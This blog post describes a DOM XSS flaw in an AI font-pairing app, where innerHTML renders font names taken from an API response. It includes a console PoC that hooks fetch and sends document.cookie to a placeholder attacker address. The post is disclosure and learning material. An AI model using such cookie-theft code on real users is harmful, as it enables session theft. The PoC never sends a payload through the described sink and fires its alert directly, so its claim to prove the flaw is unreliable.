## Introduction

I was reading a blog post by [Bobby Cooke](https://0xboku.com/2021/09/14/0dayappsecBeginnerGuide.html) and it inspired me to hunt for my first CVE. This post is heavily influenced by his blog, so please go check it out. I’m not claiming this is the greatest CVE ever, this was honestly mostly for fun and to learn (and to say I got a CVE lol).

## **Short Story: How I Found It**

I was poking around this AI font-pairing application, and I was able to notice it takes font names from a Web Fonts API and drops them into the DOM with `innerHTML`. Even with my limited knowledge of web apps, I was able to tell this can be vulnerable to XSS. I was able to built a quick PoC, submitted it to MITRE for reviewal and I was able to get the CVE published.

## Source Code Review

### Vulnerable Sink

I started with the UI code that builds the font options. In `script.js`, each font option is being rendered with **'innerHTML'** (see screenshot).

### Why It's Risky

1.  **`innerHTML` with untrusted data.** `font.family` is inserted via `innerHTML`, what does this mean? This means that the browser parses it as HTML (not text) which can lead us to DOM XSS.
2. - **Attribute injection.** The same value is interpolated into `style="font-family:'…'"`, which creates us a second injection point if we break out of the quotes.

This application also pulls fonts from Google’s Web Fonts API:

If an attacker can supply or intercept the `webfonts` response, the untrusted `font.family` will get written directly into the page via `innerHTML`.

## Quick Demo (PoC)

I used a tiny fetch hook in the browser console to simulate a malicious `webfonts` response and proved we can in fact get code execution.

### Steps:

1. Run the app locally and open DevTools → Console
2. Paste the PoC below.
3. Trigger the UI that loads fonts.
4. You will then see an alert box and the injected node in Elements.

```powershell
window.__origFetch = window.fetch;
window.fetch = async function(input, init) {
    const url = (typeof input === 'string') ? input : input?.url;
    if (url && url.includes('webfonts')) {
        // Exfiltrate cookie to attacker-controlled server
        fetch('http://[your-ip]:8001/steal?cookie=' + 
              encodeURIComponent(document.cookie))
            .catch(e => console.log('Exfil failed:', e));
        
        return new Response(JSON.stringify({
            kind: "webfonts#webfontList",
            items: [{ family: "Playfair Display", category: "serif" }]
        }), {
            status: 200, 
            headers: {'Content-Type': 'application/json'}
        });
    }
    return window.__origFetch.apply(this, arguments);
};
alert('https://dylandavis1.github.io');
```

And boom, we are able to get our XSS payload to execute.

## Conclusion

This was a fun little win for me, I was able to strengthen my web app skills, publish a PoC, and landed my first CVE. If you spot anything I have missed or have fix ideas, feel free to DM me!
